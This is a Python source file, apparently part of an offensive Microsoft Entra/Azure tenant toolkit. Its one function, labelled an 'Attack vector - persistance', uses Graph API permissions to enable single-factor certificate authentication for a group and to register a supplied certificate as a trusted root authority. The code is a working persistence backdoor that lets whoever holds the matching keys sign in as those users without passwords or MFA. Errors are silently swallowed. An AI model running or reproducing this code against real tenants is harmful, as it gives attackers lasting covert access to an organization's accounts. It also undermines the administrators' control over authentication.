import requests
import colorama
from colorama import Fore, Style
import base64


def OrgAuthMeth_Vectors(request_headers, OrgAuthSettings, tenantId):
    print()
    print(
        "Organization.RW.All - Allows the app to read and write the organization and related resources, on behalf of the signed-in user.")
    print()
    try:
        print("Attack vector - persistance")


        create_message_URL = "https://graph.microsoft.com/beta/policies/authenticationmethodspolicy/authenticationMethodConfigurations/X509Certificate"
        message_obj = {"@odata.type":"#microsoft.graph.x509CertificateAuthenticationMethodConfiguration","id":"X509Certificate","certificateUserBindings":[{"x509CertificateField":"PrincipalName","userProperty":"userPrincipalName","priority":1,"trustAffinityLevel":"low"},{"x509CertificateField":"RFC822Name","userProperty":"userPrincipalName","priority":2,"trustAffinityLevel":"low"},{"x509CertificateField":"SubjectKeyIdentifier","userProperty":"certificateUserIds","priority":3,"trustAffinityLevel":"high"}],"authenticationModeConfiguration":{"x509CertificateAuthenticationDefaultMode":"x509CertificateSingleFactor","x509CertificateDefaultRequiredAffinityLevel":"low","rules":[]},"includeTargets":[{"id":OrgAuthSettings["groupId"],"isRegistrationRequired":"false","targetType":"group"}],"excludeTargets":[],"state":"enabled"}
        result = requests.patch(create_message_URL, json=message_obj, headers=request_headers)
        if result.status_code == 204:
            with open(OrgAuthSettings["cert_file"], 'rb') as cert_file:
                cert_bytes = cert_file.read()
                cert_base64 = base64.b64encode(cert_bytes)

            cert = cert_base64.decode('utf-8')
            create_message_URL = "https://graph.microsoft.com/v1.0/organization/" + tenantId + "/certificateBasedAuthConfiguration"
            message_obj = {"certificateAuthorities":[{"isRootAuthority":"true","certificateRevocationListUrl":"","deltaCertificateRevocationListUrl":"","certificate":cert}]}

            result = requests.post(create_message_URL, json=message_obj, headers=request_headers)
            if result.status_code == 201:
                print(Fore.GREEN + "added the group to cert authentication.")
                print(Style.RESET_ALL)

    except:
        pass
